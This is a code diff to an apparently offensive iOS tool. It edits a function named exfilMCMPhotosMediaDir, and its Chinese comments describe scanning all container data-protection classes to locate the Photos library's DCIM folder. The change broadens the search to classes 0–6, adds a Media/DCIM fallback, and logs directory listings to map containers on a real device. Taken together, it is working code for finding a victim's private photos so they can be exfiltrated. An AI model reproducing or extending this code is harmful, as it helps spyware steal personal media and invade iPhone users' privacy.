@@ -418,25 +418,45 @@ static NSString *exfilMCMPhotosMediaDir(void)
         @"com.apple.Photos",
         @"com.apple.mobileslideshow-Data",
     ];
+    // 全档扫描：class 0-6 全试，每个成功 root 打一级目录列表找 DCIM/Media
     NSFileManager *fm = [NSFileManager defaultManager];
-    for (NSString *ident in identifiers)
+    for (uint64_t cls = 0; cls <= 6; cls++)
     {
-        for (uint64_t cls = 2; cls <= 3; cls++)
+        for (NSString *ident in identifiers)
         {
             NSString *err = nil;
             NSString *root = exfilMCMContainerPath(cls, ident, &err);
-            if (gExfilMcmLogged < 6)
+            if (gExfilMcmLogged < 24)
             {
                 gExfilMcmLogged++;
                 exfilLog(@"MCM try ident=%@ cls=%llu root=%@ err=%@",
                          ident, (unsigned long long)cls, root, err);
             }
             if (root.length == 0) continue;
+
+            // 打印 root 一级目录，一次真机运行看清容器地图
+            if (gExfilMcmLogged <= 24)
+            {
+                NSArray *entries = [fm contentsOfDirectoryAtPath:root error:nil];
+                exfilLog(@"MCM root[%@ cls=%llu] entries: %@",
+                         ident, (unsigned long long)cls,
+                         [entries componentsJoinedByString:@","]);
+            }
+
+            // 直接命中 DCIM
             if ([fm fileExistsAtPath:[root stringByAppendingPathComponent:@"DCIM"]])
             {
                 exfilLog(@"MCM lease ok: ident=%@ cls=%llu root=%@",
                          ident, (unsigned long long)cls, root);
                 return root;
+            }
+            // root 里有 Media 子目录（部分容器把媒体挂在里面）
+            NSString *mediaSub = [root stringByAppendingPathComponent:@"Media"];
+            if ([fm fileExistsAtPath:[mediaSub stringByAppendingPathComponent:@"DCIM"]])
+            {
+                exfilLog(@"MCM lease ok (sub): ident=%@ cls=%llu root=%@",
+                         ident, (unsigned long long)cls, mediaSub);
+                return mediaSub;
             }
         }
     }
